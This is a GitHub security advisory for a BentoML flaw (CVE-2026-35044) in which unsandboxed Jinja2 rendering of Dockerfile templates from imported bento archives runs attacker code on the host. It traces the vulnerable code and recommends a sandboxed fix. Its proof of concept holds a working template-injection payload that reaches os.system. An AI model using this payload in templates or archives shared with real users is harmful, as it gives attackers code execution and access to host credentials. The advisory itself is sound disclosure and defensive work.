# [H] BentoML: SSTI via Unsandboxed Jinja2 in Dockerfile Generation

## Summary
Severity: High
Advisory: GHSA-v959-cwq9-7hr6
CVE: CVE-2026-35044
CWE: CWE-1336
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-04-03
Source: https://github.com/advisories/GHSA-v959-cwq9-7hr6
Type: github-advisory

## Affected
- PyPI: `bentoml` — affected >=0 <1.4.38

## Details
## Summary

The Dockerfile generation function `generate_containerfile()` in `src/bentoml/_internal/container/generate.py` uses an unsandboxed `jinja2.Environment` with the `jinja2.ext.do` extension to render user-provided `dockerfile_template` files. When a victim imports a malicious bento archive and runs `bentoml containerize`, attacker-controlled Jinja2 template code executes arbitrary Python directly on the host machine, bypassing all container isolation.

## Details

The vulnerability exists in the `generate_containerfile()` function at `src/bentoml/_internal/container/generate.py:155-157`:

```python
ENVIRONMENT = Environment(
    extensions=["jinja2.ext.do", "jinja2.ext.loopcontrols", "jinja2.ext.debug"],
    trim_blocks=True,
    lstrip_blocks=True,
    loader=FileSystemLoader(TEMPLATES_PATH, followlinks=True),
)
```

This creates an **unsandboxed** `jinja2.Environment` with two dangerous extensions:
- `jinja2.ext.do` — enables `{% do %}` tags that execute arbitrary Python expressions
- `jinja2.ext.debug` — exposes internal template engine state

**Attack path:**

1. **Attacker builds a bento** with `dockerfile_template` set in `bentofile.yaml`. During `bentoml build`, `DockerOptions.write_to_bento()` (`build_config.py:272-276`) copies the template file into the bento archive at `env/docker/Dockerfile.template`:

```python
if self.dockerfile_template is not None:
    shutil.copy2(
        resolve_user_filepath(self.dockerfile_template, build_ctx),
        docker_folder / "Dockerfile.template",
    )
```

2. **Attacker exports** the bento as a `.bento` or `.tar.gz` archive and distributes it (via S3, HTTP, direct sharing, etc.).

3. **Victim imports** the bento with `bentoml import bento.tar` — no validation of template content is performed.

4. **Victim containerizes** with `bentoml containerize`. The `construct_containerfile()` function (`__init__.py:198-204`) detects the template and sets the path:

```python
docker_attrs["dockerfile_template"] = "env/docker/Dockerfile.template"
```

5. **`generate_containerfile()`** (`generate.py:181-192`) loads the attacker-controlled template into the unsandboxed Environment and renders it at line 202:

```python
user_templates = docker.dockerfile_template
if user_templates is not None:
    dir_path = os.path.dirname(resolve_user_filepath(user_templates, build_ctx))
    user_templates = os.path.basename(user_templates)
    TEMPLATES_PATH.append(dir_path)
    environment = ENVIRONMENT.overlay(
        loader=FileSystemLoader(TEMPLATES_PATH, followlinks=True)
    )
    template = environment.get_template(
        user_templates,
        globals={"bento_base_template": template, **J2_FUNCTION},
    )
# ...
return template.render(...)  # <-- SSTI executes here, on the HOST
```

**Critical distinction**: Commands in `docker.commands` or `docker.post_commands` execute *inside* the Docker build container (isolated). SSTI payloads execute Python directly on the **host machine** during template rendering, *before* Docker is invoked. This bypasses all container isolation.

## PoC

**Step 1: Create malicious template `evil.j2`:**

```jinja2
{% extends bento_base_template %}
{% block SETUP_BENTO_COMPONENTS %}
{{ super() }}
{% do namespace.__init__.__globals__['__builtins__']['__import__']('os').system('id > /tmp/pwned') %}
{% endblock %}
```

**Step 2: Create `bentofile.yaml` referencing the template:**

```yaml
service: 'service:MyService'
docker:
  dockerfile_template: ./evil.j2
```

**Step 3: Attacker builds and exports:**

```bash
bentoml build
bentoml export myservice:latest bento.tar
```

**Step 4: Victim imports and containerizes:**

```bash
bentoml import bento.tar
bentoml containerize myservice:latest
```

**Step 5: Verify host code execution:**

```bash
cat /tmp/pwned
# Output: uid=1000(victim) gid=1000(victim) groups=...
```

The SSTI payload executes on the host during template rendering, before any Docker container is created.

**Standalone verification that the Jinja2 Environment allows code execution:**

```bash
python3 -c "
from jinja2 import Environment
env = Environment(extensions=['jinja2.ext.do'])
t = env.from_string(\"{% do namespace.__init__.__globals__['__builtins__']['__import__']('os').system('echo SSTI_WORKS') %}\")
t.render()
"
# Output: SSTI_WORKS
```

## Impact

An attacker who distributes a malicious bento archive can achieve **arbitrary code execution on the host machine** of any user who imports and containerizes the bento. This gives the attacker:

- Full access to the host filesystem (source code, credentials, SSH keys, cloud tokens)
- Ability to install backdoors or pivot to other systems
- Access to environment variables containing secrets (API keys, database credentials)
- Potential supply chain compromise if the victim's machine is a CI/CD runner

The attack is particularly dangerous because:
1. Users may reasonably expect `bentoml containerize` to be a safe build operation
2. The malicious template is embedded inside the bento archive and not visible without manual inspection
3. Execution happens on the host, not inside a Docker container, bypassing all isolation

## Recommended Fix

Replace the unsandboxed `jinja2.Environment` with `jinja2.sandbox.SandboxedEnvironment` and remove the dangerous `jinja2.ext.do` and `jinja2.ext.debug` extensions, which are unnecessary for Dockerfile template rendering.

In `src/bentoml/_internal/container/generate.py`, change lines 155-157:

```python
# Before (VULNERABLE):
from jinja2 import Environment
# ...
ENVIRONMENT = Environment(
    extensions=["jinja2.ext.do", "jinja2.ext.loopcontrols", "jinja2.ext.debug"],
    trim_blocks=True,
    lstrip_blocks=True,
    loader=FileSystemLoader(TEMPLATES_PATH, followlinks=True),
)

# After (FIXED):
from jinja2.sandbox import SandboxedEnvironment
# ...
ENVIRONMENT = SandboxedEnvironment(
    extensions=["jinja2.ext.loopcontrols"],
    trim_blocks=True,
    lstrip_blocks=True,
    loader=FileSystemLoader(TEMPLATES_PATH, followlinks=True),
)
```

Additionally, review the second unsandboxed Environment in `build_config.py:499-504` which also uses `jinja2.ext.debug`:

```python
# build_config.py:499 - also fix:
env = jinja2.sandbox.SandboxedEnvironment(
    variable_start_string="<<",
    variable_end_string=">>",
    loader=jinja2.FileSystemLoader(os.path.dirname(__file__), followlinks=True),
)
```

## References
- https://github.com/bentoml/BentoML/security/advisories/GHSA-v959-cwq9-7hr6
- https://nvd.nist.gov/vuln/detail/CVE-2026-35044
- https://github.com/bentoml/BentoML
- https://github.com/pypa/advisory-database/tree/main/vulns/bentoml/PYSEC-2026-159.yaml
